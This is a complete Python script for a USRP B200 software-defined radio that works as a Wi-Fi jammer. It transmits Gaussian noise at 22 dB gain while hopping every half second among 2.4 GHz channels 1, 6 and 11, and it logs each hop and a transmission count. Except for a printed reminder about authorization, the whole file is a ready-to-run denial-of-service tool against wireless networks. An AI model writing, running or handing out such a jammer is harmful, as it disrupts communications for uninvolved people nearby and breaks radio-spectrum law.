#!/usr/bin/env python3
import uhd
import numpy as np
import time
import threading
import signal
import sys
import logging
from datetime import datetime

class ChannelHopper:
    def __init__(self, rate=10e6, gain=22, hop_interval=0.5):
        self.channels_24 = [2.412e9, 2.437e9, 2.462e9]  # Ch1,6,11
        self.channels_5 = [5.180e9, 5.200e9, 5.745e9]   # Ch36,40,149
        self.current_idx = 0
        self.rate = rate
        self.gain = gain
        self.hop_interval = hop_interval
        self.usrp = None
        self.streamer = None
        self.noise = None
        self.running = False
        self.hopper_thread = None
        self.lock = threading.Lock()
        
        # Setup logging
        self.setup_logging()
        
        # Initialize hardware
        self.init_hardware()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
    def setup_logging(self):
        """Configure logging with timestamps"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('channel_hopper.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def init_hardware(self):
        """Initialize USRP hardware with error handling"""
        try:
            self.logger.info("Initializing USRP B200...")
            self.usrp = uhd.usrp.MultiUSRP("type=b200")
            
            # Get device info
            mboard_name = self.usrp.get_mboard_name()
            serial = self.usrp.get_mboard_serial()
            self.logger.info(f"USRP detected: {mboard_name} (S/N: {serial})")
            
            # Generate noise buffer
            self.noise = self.generate_noise(65536)
            self.logger.info("Hardware initialization completed")
            
        except Exception as e:
            self.logger.error(f"Hardware initialization failed: {e}")
            raise
    
    def generate_noise(self, nsamples):
        """Generate complex Gaussian noise with error handling"""
        try:
            real = np.random.normal(0, 1, nsamples)
            imag = np.random.normal(0, 1, nsamples)
            noise = (real + 1j * imag) / np.sqrt(2)
            return noise
        except Exception as e:
            self.logger.error(f"Noise generation failed: {e}")
            raise
    
    def setup_tx(self):
        """Configure TX chain with comprehensive error handling"""
        try:
            with self.lock:
                self.logger.info(f"Setting up TX: {self.rate/1e6:.1f}MS/s, {self.gain}dB gain")
                
                self.usrp.set_tx_rate(self.rate)
                actual_rate = self.usrp.get_tx_rate()
                self.logger.info(f"TX rate set: {actual_rate/1e6:.3f} MS/s")
                
                self.usrp.set_tx_gain(self.gain, 0)
                actual_gain = self.usrp.get_tx_gain(0)
                self.logger.info(f"TX gain set: {actual_gain} dB")
                
                self.usrp.set_tx_antenna("TX/RX", 0)
                
                # Create streamer
                stream_args = uhd.usrp.StreamArgs("fc32", "sc16")
                self.streamer = self.usrp.get_tx_streamer(stream_args)
                max_samps = self.streamer.get_max_num_samps()
                self.logger.info(f"TX streamer created (max samples: {max_samps})")
                
        except Exception as e:
            self.logger.error(f"TX setup failed: {e}")
            raise
    
    def hop_channel(self):
        """Channel hopping thread with error handling"""
        self.logger.info("Channel hopping thread started")
        
        while self.running:
            try:
                with self.lock:
                    freq = self.channels_24[self.current_idx % len(self.channels_24)]
                    
                    tune_req = uhd.libpyuhd.types.tune_request(freq)
                    self.usrp.set_tx_freq(tune_req, 0)
                    
                    # Verify tuning
                    actual_freq = self.usrp.get_tx_freq(0)
                    freq_error = abs(actual_freq - freq)
                    
                    if freq_error > 1e6:  # More than 1MHz error
                        self.logger.warning(f"Frequency tuning error: {freq_error/1e3:.1f}kHz")
                    
                    self.logger.info(f"Hopped to {actual_freq/1e9:.3f}GHz (target: {freq/1e9:.3f}GHz)")
                    self.current_idx += 1
                    
            except Exception as e:
                self.logger.error(f"Channel hop failed: {e}")
                # Continue running despite hop failures
                
            try:
                time.sleep(self.hop_interval)
            except KeyboardInterrupt:
                break
                
        self.logger.info("Channel hopping thread stopped")
    
    def jam(self):
        """Main jamming function with graceful error handling"""
        try:
            self.logger.info("Starting channel hopping jammer")
            self.running = True
            
            # Setup TX chain
            self.setup_tx()
            
            # Start hopping thread
            self.hopper_thread = threading.Thread(target=self.hop_channel, daemon=True)
            self.hopper_thread.start()
            
            # Main TX loop
            metadata = uhd.types.TXMetadata()
            tx_buffer = self.noise.astype(np.complex64)
            
            self.logger.info("Channel hopping jammer ACTIVE - transmitting noise")
            
            transmission_count = 0
            start_time = time.time()
            
            while self.running:
                try:
                    with self.lock:
                        if self.streamer:
                            self.streamer.send(tx_buffer, metadata)
                            transmission_count += 1
                            
                            # Log every 1000 transmissions
                            if transmission_count % 1000 == 0:
                                elapsed = time.time() - start_time
                                rate = transmission_count / elapsed
                                self.logger.debug(f"Transmission rate: {rate:.1f} tx/sec")
                                
                except Exception as e:
                    self.logger.error(f"Transmission error: {e}")
                    time.sleep(0.1)  # Brief pause before retry
                    continue
                    
        except Exception as e:
            self.logger.error(f"Jammer startup failed: {e}")
            raise
        finally:
            self.cleanup()
    
    def signal_handler(self, sig, frame):
        """Handle shutdown signals gracefully"""
        self.logger.info(f"Received signal {sig} - initiating graceful shutdown")
        self.running = False
        
        if self.hopper_thread and self.hopper_thread.is_alive():
            self.logger.info("Waiting for hopping thread to stop...")
            self.hopper_thread.join(timeout=2.0)
            if self.hopper_thread.is_alive():
                self.logger.warning("Hopping thread did not stop gracefully")
        
        self.cleanup()
        self.logger.info("Graceful shutdown completed")
        sys.exit(0)
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            self.logger.info("Cleaning up resources...")
            
            with self.lock:
                if self.streamer:
                    # Note: UHD streamers don't have explicit close methods
                    self.streamer = None
                    
                if self.usrp:
                    # Reset gain to minimum
                    try:
                        self.usrp.set_tx_gain(0, 0)
                        self.logger.info("TX gain reset to minimum")
                    except:
                        pass
                        
            self.logger.info("Resource cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Cleanup error: {e}")

if __name__ == "__main__":
    try:
        print("🚨 WARNING: This device will transmit RF signals!")
        print("📻 Ensure you have proper authorization and licensing")
        print("🔧 Press Ctrl+C to stop at any time")
        print()
        
        # Create channel hopper with configurable parameters
        hopper = ChannelHopper(
            rate=10e6,           # 10 MS/s sample rate
            gain=22,             # 22 dB TX gain
            hop_interval=0.5     # 500ms between hops
        )
        
        # Start jamming
        hopper.jam()
        
    except KeyboardInterrupt:
        print("\n👋 Shutdown requested by user")
    except Exception as e:
        print(f"\n💥 Fatal error: {e}")
        sys.exit(1)
    finally:
        print("🏁 Channel hopper stopped")